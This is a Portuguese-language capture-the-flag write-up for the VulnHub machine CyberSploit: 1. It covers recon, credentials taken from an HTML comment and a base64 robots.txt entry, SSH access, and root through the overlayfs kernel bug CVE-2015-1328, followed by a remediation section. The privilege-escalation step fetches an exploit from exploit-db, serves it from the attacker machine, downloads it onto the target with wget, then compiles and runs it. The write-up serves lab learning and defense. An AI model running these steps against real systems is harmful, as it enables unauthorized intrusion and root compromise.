# CyberSploit: 1 — Writeup (PT-BR)

> Uma box que esconde seus segredos à vista de todos: um está num comentário no HTML, outro está bem ali no `robots.txt`, e o último é um kernel que nunca foi atualizado. ¯\_(ツ)_/¯
>
> Dificuldade fácil. Ótima para iniciantes. Três passos até o root, e cada pista é entregue de bandeja. Você só precisa saber onde olhar. ( ͡° ͜ʖ ͡°)

---

| Campo | Valor |
|-------|-------|
| **Level** | Fácil |
| **VM Alvo** | CyberSploit: 1 (Linux) |
| **VM Atacante** | Kali Linux 2023+ |
| **VulnHub URL** | https://www.vulnhub.com/entry/cybersploit-1,506/ |
| **Técnicas** | Enumeração web, credencial vazada em comentário HTML, enumeração de robots.txt, decodificação base64, login SSH com credenciais descobertas, escalação de privilégio via exploit de kernel local |
| **CVEs** | CVE-2015-1328 (escalação de privilégio local via overlayfs no Linux, kernel 3.13.0) |
| **Grupos APT** | APT28 (uso de exploit de kernel pós-acesso inicial), atores oportunistas genéricos alvejando sistemas Linux sem patch |

---

## Resumo do Ataque

```
[nmap] portas 22, 80
    |
    v
[curl /robots.txt] string base64 com senha + Flag 1
    |
    v
[view-source:/] comentário HTML: "username: itsskv"
    |
    v
[base64 -d] decodificar senha
    |
    v
[ssh itsskv@ALVO] acesso inicial
    |
    v
[cat flag2.txt] Flag 2 em binário -> decodificar com CyberChef (From Binary)
    |
    v
[uname -r] kernel 3.13.0-32-generic (CVE-2015-1328)
    |
    v
[gcc 37292.c -o overlayfs && ./overlayfs] shell root
    |
    v
[cat /root/flag.txt] PRONTO
```

---

## Metodologia

1. Descoberta de host (netdiscover)
2. Scan de portas e identificação de serviços (nmap)
3. Enumeração web: código-fonte HTML, robots.txt, brute-force de diretório
4. Decodificação de credenciais (base64)
5. Acesso inicial via SSH
6. Verificação da versão do kernel e identificação de CVE
7. Compilação e execução de exploit para escalação de privilégio (CVE-2015-1328, EDB-37292)

---

## Passo 1: Descoberta de Host

O alvo recebe IP por DHCP, então comece descobrindo-o no segmento de rede local:

```bash
netdiscover -r 192.168.1.0/24
```

Saída esperada (resumida):

```
 IP            At MAC Address     Count     Len  MAC Vendor / Hostname
 192.168.1.x   08:00:27:xx:xx:xx      1      60  PCS Systemtechnik GmbH
```

Anote o endereço IP do adaptador VirtualBox. Defina como variável de alvo:

```bash
export TARGET=192.168.1.x
```

> **TTP MITRE:** T1595.001 — Active Scanning: Scanning IP Blocks

---

## Passo 2: Scan de Portas

Execute um scan completo de serviços contra o alvo:

```bash
nmap -sV -sC -p- $TARGET
```

Portas abertas principais:

| Porta | Serviço |
|-------|---------|
| 22    | OpenSSH |
| 80    | Apache HTTP |

Apenas duas superfícies de ataque: SSH e HTTP. Vamos verificar o servidor web primeiro.

> **TTP MITRE:** T1595.002 — Active Scanning: Vulnerability Scanning

> **Alternativa:** `rustscan -a $TARGET -- -sV -sC` para uma varredura inicial mais rápida.

---

## Passo 3: Enumeração Web

### Código-fonte HTML: nome de usuário num comentário

Acesse `http://$TARGET/` e veja o código-fonte da página (Ctrl+U na maioria dos browsers):

```bash
curl -s http://$TARGET/ | grep -i "<!--"
```

Dentro você vai encontrar:

```html
<!-- username: itsskv -->
```

É ele. O desenvolvedor deixou o nome de usuário SSH diretamente no HTML da página. ( •_•)

> **TTP MITRE:** T1589.003 — Gather Victim Identity Information: Employee Names

### robots.txt: senha em base64

Busque o `robots.txt`:

```bash
curl http://$TARGET/robots.txt
```

O campo `Disallow` contém uma string em base64. Algo assim:

```
Disallow: Y3liZXJzcGxvaXR7eW91dHViZS5jb20vYy9jeWJlcnNwbG9pdH0=
```

Decodifique:

```bash
echo "Y3liZXJzcGxvaXR7eW91dHViZS5jb20vYy9jeWJlcnNwbG9pdH0=" | base64 -d
```

A saída decodificada é a senha E a Flag 1 na mesma string.

> **Relevância no mundo real:** Colocar segredos no `robots.txt` é surpreendentemente comum. O arquivo é publicamente legível, indexado por mecanismos de busca e ferramentas como Shodan e Wayback Machine, e lido por atacantes como um dos primeiros passos de reconhecimento.

> **TTP MITRE:** T1552.001 — Credentials in Files; T1083 — File and Directory Discovery

### Brute-force de diretório

Enquanto você tem as credenciais, também execute uma varredura rápida de diretórios para identificar qualquer coisa de interesse:

```bash
gobuster dir -u http://$TARGET/ -w /usr/share/wordlists/dirb/common.txt -q
```

Nada crítico encontrado para exploração nessa box, mas sempre enumere completamente. Paranoia é uma habilidade.

> **Alternativa:** `feroxbuster -u http://$TARGET/ -w /usr/share/seclists/Discovery/Web-Content/common.txt` dá resultados recursivos.

---

## Passo 4: Acesso Inicial via SSH

Agora você tem o nome de usuário do comentário HTML e a senha da entrada decodificada do `robots.txt`. Faça login:

```bash
ssh itsskv@$TARGET
# Senha: <valor base64 decodificado>
```

Saída esperada:

```
Welcome to Ubuntu 12.04.5 LTS (GNU/Linux 3.13.0-32-generic x86_64)
itsskv@cybersploit-CTF:~$
```

Estamos dentro. ( ˘ ³˘)♥

Leia a segunda flag:

```bash
cat flag2.txt
```

O conteúdo é texto codificado em binário: grupos de 0s e 1s representando valores ASCII. Decodifique com o CyberChef (operação From Binary) em `https://gchq.github.io/CyberChef/`, ou na linha de comando:

```bash
# Na máquina atacante: cole a string binária e decodifique
python3 -c "
binary = 'cole os 0s e 1s aqui'
chars = [chr(int(b, 2)) for b in binary.split()]
print(''.join(chars))
"
```

> **TTP MITRE:** T1078 — Valid Accounts; T1021.004 — Remote Services: SSH

---

## Passo 5: Escalação de Privilégio — CVE-2015-1328

Verifique a versão do kernel:

```bash
uname -r
# 3.13.0-32-generic
```

O kernel `3.13.0-32-generic` é vulnerável ao CVE-2015-1328, uma escalação de privilégio local na implementação do sistema de arquivos overlayfs. Quando `FS_USERNS_MOUNT` está habilitado (como está aqui), um usuário sem privilégios pode montar um overlayfs com uma estrutura de diretório manipulada e escalar para root. O exploit público é o EDB-37292.

**Na máquina atacante:** Baixe e sirva o código-fonte do exploit:

```bash
wget https://www.exploit-db.com/raw/37292 -O /tmp/37292.c
python3 -m http.server 8080
```

**Na máquina alvo:** Baixe, compile e execute:

```bash
cd /tmp
wget http://$LHOST:8080/37292.c -O 37292.c
gcc 37292.c -o overlayfs
chmod +x overlayfs
./overlayfs
```

Saída esperada:

```
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# id
uid=0(root) gid=0(root)
```

Shell root. Bingo!! (☞ﾟヮﾟ)☞

> **TTP MITRE:** T1068 — Exploitation for Privilege Escalation; T1105 — Ingress Tool Transfer

> **Relevância no mundo real:** O CVE-2015-1328 tem quase uma década, mas sistemas rodando Ubuntu 12.04/14.04 com esse kernel ainda são encontrados em ambientes legados, dispositivos embarcados e instâncias de nuvem que nunca foram atualizadas. O APT28 e vários grupos de ransomware usaram exploits de kernel LPE dessa família como parte da escalação de privilégio pós-comprometimento.

> **Alternativa:** `linux-exploit-suggester` (`./linux-exploit-suggester.sh`) ou `LES` identificará esse CVE automaticamente a partir da saída de `uname -r`.

---

## Passo 6: Flag Root

```bash
cat /root/flag.txt
```

Pronto. ᕕ( ᐛ )ᕗ

---

## Flags / Hashes / Credenciais Capturadas

| Item | Valor |
|------|-------|
| Nome de usuário SSH | `itsskv` (comentário HTML) |
| Senha SSH / Flag 1 | `cybersploit{...}` (base64 decodificado do robots.txt) |
| Flag 2 | Codificada em binário (decodificar com CyberChef From Binary) |
| Flag root | `/root/flag.txt` |
| CVE explorado | CVE-2015-1328 (EDB-37292, overlayfs LPE) |

---

## Lições Aprendidas

1. **Credenciais em comentários HTML** são trivialmente descobertas por qualquer atacante com `curl` ou um browser. Nada que você colocar no código-fonte HTML é privado.

2. **`robots.txt` não é um cofre de segredos.** O arquivo é publicamente legível, indexado por mecanismos de busca e ferramentas de segurança, e lido por atacantes como um dos primeiros passos de reconhecimento. Nunca armazene credenciais, tokens ou dicas de caminhos lá.

3. **Base64 é codificação, não criptografia.** Uma string base64 em qualquer arquivo público não oferece nenhuma confidencialidade. Leva um comando para decodificar.

4. **Kernels sem patch desde 2015 rodando em 2024+** não são apenas um cenário de laboratório. Sistemas legados, dispositivos embarcados e VMs de nuvem de longa duração frequentemente rodam kernels com vulnerabilidades LPE conhecidas e críticas.

5. **Descoberta de credencial em camadas** (comentário HTML para nome de usuário, robots.txt para senha) significa que mesmo "segredos divididos" podem ser reconstruídos trivialmente quando ambas as partes são publicamente acessíveis.

**Relevância no Mundo Real:** Esse padrão (credenciais em comentários HTML, dicas em robots.txt, kernel sem patch) corresponde exatamente ao tipo de alvo fácil que scanners automatizados e brokers de acesso inicial exploram para comprometer sistemas em escala. CyberSploit: 1 é uma foto realista de como um servidor Linux interno negligenciado parece da perspectiva do atacante.

---

## Mapeamento MITRE ATT&CK

| Tática | Técnica | ID | Ferramenta |
|--------|---------|-----|------------|
| Reconhecimento | Active Scanning: Scanning IP Blocks | T1595.001 | netdiscover |
| Reconhecimento | Active Scanning: Vulnerability Scanning | T1595.002 | nmap |
| Reconhecimento | Gather Victim Identity Information: Employee Names | T1589.003 | curl/browser |
| Acesso a Credenciais | Credentials in Files | T1552.001 | curl /robots.txt |
| Acesso a Credenciais | Unsecured Credentials | T1552 | comentário HTML |
| Acesso Inicial | Valid Accounts | T1078 | SSH |
| Movimentação Lateral | Remote Services: SSH | T1021.004 | ssh |
| Escalação de Privilégio | Exploitation for Privilege Escalation | T1068 | CVE-2015-1328 |
| Comando e Controle | Ingress Tool Transfer | T1105 | python3 http.server |
| Descoberta | File and Directory Discovery | T1083 | gobuster |

---

## Remediação

### NIST CSF 2.0

| Função | Controle | Ação |
|--------|----------|------|
| Identificar (ID.AM) | Inventário de ativos | Identificar todos os sistemas Linux rodando kernels mais antigos que a versão 4.x |
| Proteger (PR.DS) | Segurança de dados | Remover todas as credenciais e dicas do código-fonte HTML e do robots.txt |
| Proteger (PR.IP) | Tecnologia de proteção | Aplicar política de patches de kernel; definir versão mínima de kernel suportada |
| Detectar (DE.CM) | Monitoramento contínuo | Alertar sobre compilação de exploit em /tmp; alertar sobre eventos de montagem de overlayfs |
| Recuperar (RC.RP) | Planejamento de recuperação | Definir SLAs de patch para CVEs críticos de kernel |

### NIST SP 800-53 Rev. 5

| Controle | Descrição |
|---------|-----------|
| SI-2 | Remediação de Falhas: corrigir kernel para versão suportada (4.x+); aplicar atualizações de segurança Ubuntu |
| IA-5 | Gerenciamento de Autenticador: remover credenciais do HTML e do robots.txt; usar um gerenciador de segredos |
| CM-6 | Definições de Configuração: desabilitar montagens de namespace de usuário não privilegiadas se não necessário (`sysctl kernel.unprivileged_userns_clone=0`) |
| AU-12 | Geração de Registros de Auditoria: habilitar auditd para registrar eventos de montagem e execução de arquivos em /tmp |

### CISA KEV

O CVE-2015-1328 não está atualmente no catálogo CISA KEV (é anterior ao escopo inicial do catálogo para a maioria das versões), mas o Ubuntu 12.04 e 14.04 chegaram ao fim de vida há anos. Sistemas rodando essas versões devem ser considerados totalmente comprometidos por qualquer atacante com acesso local.

### C2M2 (Cybersecurity Capability Maturity Model)

| Domínio | Prática | Lacuna |
|---------|---------|--------|
| Asset, Change, and Configuration Management (ASSET) | MIL-1 | Sem rastreamento de versões de SO end-of-life no inventário de ativos |
| Threat and Vulnerability Management (THREAT) | MIL-1 | CVEs de kernel não identificados nem priorizados para patch |
| Situational Awareness (SA) | MIL-1 | Sem monitoramento de compilação de exploit ou eventos de montagem anormais |

### MITRE D3FEND

| Técnica D3FEND | ID | Endereça |
|----------------|----|----------|
| Software Update | D3-SU | Corrigir kernel além do CVE-2015-1328 |
| Application Configuration Hardening | D3-ACH | Desabilitar namespaces de usuário não privilegiados: `kernel.unprivileged_userns_clone=0` |
| File System Access Pattern Analysis | D3-FSAPA | Alertar sobre operações de montagem overlayfs por usuários não-root |
| Executable Allowlisting | D3-EAL | Restringir execução de binários compilados em /tmp com opção de montagem noexec |
| Credential Hardening | D3-CH | Remover credenciais do código client-side e arquivos de configuração públicos |

---

## Considerações Finais

CyberSploit: 1 merece sua classificação de "fácil," mas não deixe isso te enganar a pular. Cada técnica aqui aparece constantemente em engajamentos reais: credenciais no HTML, valores base64 no robots.txt, e um kernel antigo que ninguém se preocupou em corrigir. A box é uma lista de verificação dos ganhos mais comuns de baixo esforço em pentest.

Parabéns ao criador por construir uma box onde todo o caminho de ataque é descobrível com nada mais que `curl` e `nmap`. Às vezes as lições mais simples são as mais importantes.

Thanks guys!! (❍ᴥ❍ʋ)
